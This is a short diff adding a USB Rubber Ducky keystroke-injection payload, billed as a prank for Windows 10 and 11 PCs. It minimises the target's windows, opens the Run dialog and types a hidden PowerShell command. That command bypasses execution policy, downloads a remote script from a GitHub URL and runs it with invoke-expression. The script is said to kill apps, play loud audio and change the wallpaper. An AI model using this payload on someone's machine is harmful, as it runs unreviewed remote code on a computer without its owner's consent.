@@ -1,0 +1,26 @@
+REM     Title: HornHub
+
+REM     Author: White_Wid0w
+
+REM     Props:  I-Am-Jakoby
+
+REM     Description:  A prank payload for the rubber ducky that closes all apps, plays the cornhub drum intro loudly , and post the cornhub logo to your background on the target pc. 
+
+REM     Target: Windows 10, 11
+
+
+
+REM     Start by minimizing all their current windows
+GUI m
+DELAY 500
+
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://github.com/Zen-ith1/HornHub/blob/main/HornHub.ps1?dl=1; invoke-expression $pl
+ENTER
+
+
+
+
+
